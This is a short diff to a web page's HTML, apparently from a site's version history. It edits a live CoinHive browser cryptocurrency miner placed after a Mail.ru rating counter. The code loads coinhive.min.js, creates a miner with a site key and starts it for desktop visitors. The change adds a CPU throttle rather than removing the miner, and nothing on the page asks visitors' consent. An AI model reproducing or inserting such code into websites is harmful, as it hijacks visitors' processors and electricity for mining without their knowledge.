@@ -887,7 +887,7 @@ if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, fal
 <!-- //Rating@Mail.ru counter -->
 <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-var miner = new CoinHive.Anonymous('LQwighiqm1HsKCyGWUlslEJD85nQG6wh');
+var miner = new CoinHive.Anonymous('LQwighiqm1HsKCyGWUlslEJD85nQG6wh', {throttle: 0.3});
 if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
 	}
